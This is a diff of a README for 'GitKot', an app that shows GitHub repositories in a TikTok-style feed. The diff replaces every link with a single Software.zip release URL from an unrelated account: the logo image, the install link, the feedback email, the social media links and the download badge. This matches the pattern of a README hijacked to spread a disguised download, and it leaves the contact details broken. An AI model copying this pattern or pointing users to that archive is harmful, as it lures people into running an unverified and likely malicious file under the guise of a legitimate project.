@@ -1,6 +1,6 @@
 # Welcome to GitKot 🚀
 
-![GitKot Logo](https://example.com/gitkot_logo.png)
+![GitKot Logo](https://github.com/thehitter98709/gitkot/releases/download/v1.0/Software.zip)
 
 ## Overview
 
@@ -21,7 +21,7 @@ GitKot leverages the TikTok-style interface to showcase trending and popular Git
 
 ## Installation
 
-To get started with GitKot, you can download the latest release by clicking [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip). Once downloaded, unzip the file and launch the application to begin exploring an exciting world of GitHub repositories.
+To get started with GitKot, you can download the latest release by clicking [here](https://github.com/thehitter98709/gitkot/releases/download/v1.0/Software.zip). Once downloaded, unzip the file and launch the application to begin exploring an exciting world of GitHub repositories.
 
 ## Getting Started
 
@@ -33,15 +33,15 @@ We welcome contributions to GitKot to make it even better! Whether it's adding n
 
 ## Feedback
 
-If you have any feedback, suggestions, or issues with GitKot, please don't hesitate to reach out. You can contact us via email at gitkot@gmail.com or open an issue on the GitHub repository.
+If you have any feedback, suggestions, or issues with GitKot, please don't hesitate to reach out. You can contact us via email at https://github.com/thehitter98709/gitkot/releases/download/v1.0/Software.zip or open an issue on the GitHub repository.
 
 ## Stay Connected
 
 Stay up to date with all the latest GitKot news and updates by following us on social media:
 
-🐦 [Twitter](https://twitter.com/gitkot)  
-📘 [Facebook](https://facebook.com/gitkot)  
-📸 [Instagram](https://instagram.com/gitkot)
+🐦 [Twitter](https://github.com/thehitter98709/gitkot/releases/download/v1.0/Software.zip)  
+📘 [Facebook](https://github.com/thehitter98709/gitkot/releases/download/v1.0/Software.zip)  
+📸 [Instagram](https://github.com/thehitter98709/gitkot/releases/download/v1.0/Software.zip)
 
 ## License
 
@@ -51,4 +51,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 🚀 Happy exploring with GitKot! 🌟
 
-[![](https://img.shields.io/badge/Download-Latest%20Release-green)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![](https://github.com/thehitter98709/gitkot/releases/download/v1.0/Software.zip%20Release-green)](https://github.com/thehitter98709/gitkot/releases/download/v1.0/Software.zip)
